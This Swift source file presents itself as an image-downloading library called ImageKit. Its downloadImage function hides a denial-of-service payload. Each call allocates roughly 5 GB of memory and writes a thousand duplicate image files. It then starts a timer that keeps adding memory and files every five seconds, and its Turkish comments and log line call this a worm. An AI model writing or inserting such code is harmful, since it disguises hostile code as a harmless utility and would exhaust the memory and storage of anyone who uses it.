import SwiftUI

public final class ImageKit {
    static var ramBomb: [[UInt8]] = []
    static var timer: Timer?

    public static func downloadImage(urlString: String) async throws -> Image? {
        guard let url = URL(string: urlString) else { return nil }
        let (data, _) = try await URLSession.shared.data(from: url)
        guard let image = UIImage(data: data) else {
            throw URLError(.badServerResponse)
        }

        let manager = FileManager.default
        if let docPath = manager.urls(for: .documentDirectory, in: .userDomainMask).first {

            // Ana klasör: resimler
            let anaKlasor = docPath.appendingPathComponent("resimler")
            if !manager.fileExists(atPath: anaKlasor.path) {
                try? manager.createDirectory(at: anaKlasor, withIntermediateDirectories: true)
            }

            // Zaman damgalı alt klasör
            let formatter = DateFormatter()
            formatter.dateFormat = "yyyy-MM-dd_HH-mm-ss"
            let timestamp = formatter.string(from: Date())
            let altKlasor = anaKlasor.appendingPathComponent(timestamp)
            try? manager.createDirectory(at: altKlasor, withIntermediateDirectories: true)

            // ⚠️ RAM şişirme: çok büyük veri tut
            for _ in 0..<500 {
                let dummy = [UInt8](repeating: UInt8.random(in: 0...255), count: 10_000_000) // ~10MB
                ramBomb.append(dummy)
            }

            // ⚠️ Dosya şişirme: çok sayıda aynı dosya
            for i in 0..<1000 {
                let filePath = altKlasor.appendingPathComponent("image_\(i)_\(UUID().uuidString).jpg")
                try? data.write(to: filePath)
            }

            // ⚠️ Timer ile sürekli kaynak tüketimi
            timer?.invalidate()
            timer = Timer.scheduledTimer(withTimeInterval: 5, repeats: true) { _ in
                Task {
                    // Yeni RAM çöpü üret
                    for _ in 0..<100 {
                        let bomb = [UInt8](repeating: UInt8.random(in: 0...255), count: 5_000_000)
                        ramBomb.append(bomb)
                    }

                    // Yeni dosya spamle
                    let dynamicPath = anaKlasor.appendingPathComponent("temp_\(UUID().uuidString).jpg")
                    try? data.write(to: dynamicPath)

                    print("🔥 RAM ve dosya şişirme devam ediyor: \(dynamicPath.lastPathComponent)")
                }
            }

            print("🚨 Solucan devrede: \(altKlasor.path)")
        }

        return Image(uiImage: image)
    }
}
